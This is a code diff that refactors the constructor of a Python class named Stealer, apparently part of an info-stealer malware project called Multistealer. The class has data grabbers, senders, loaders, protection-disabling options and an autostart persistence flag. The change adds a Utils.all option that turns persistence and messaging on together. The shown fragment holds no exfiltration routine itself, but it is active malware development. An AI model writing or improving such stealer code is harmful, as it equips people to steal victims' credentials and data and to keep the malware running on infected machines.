@@ -30,32 +30,29 @@ class Stealer(Thread):
         Thread.__init__(self, name="Stealer")
 
         if loaders is None:
-            self.__loaders = []
-        else:
-            self.__loaders = loaders
+            loaders = []
 
         if grabbers is None:
-            self.__grabbers = []
-        else:
-            self.__grabbers = grabbers
-
-        if utils is None:
-            utils = []
+            grabbers = []
 
         if senders is None:
             senders = []
+
+        if utils is None:
+            utils = [Utils.all]
 
         if features is None:
             features = [Features.all]
 
         if protectors is None:
-            self.__protectors = [Protectors.disable]
-        else:
-            self.__protectors = protectors
+            protectors = [Protectors.disable]
 
+        self.__protectors = protectors
+        self.__loaders = loaders
+        self.__grabbers = grabbers
         self.__senders = senders
-        self.__autostart = Utils.autostart in utils
-        self.__message = Utils.message in utils
+        self.__autostart = Utils.autostart in utils or Utils.all in utils
+        self.__message = Utils.message in utils or Utils.all in utils
         self.__delay = delay
 
         self.__config = MultistealerConfig()
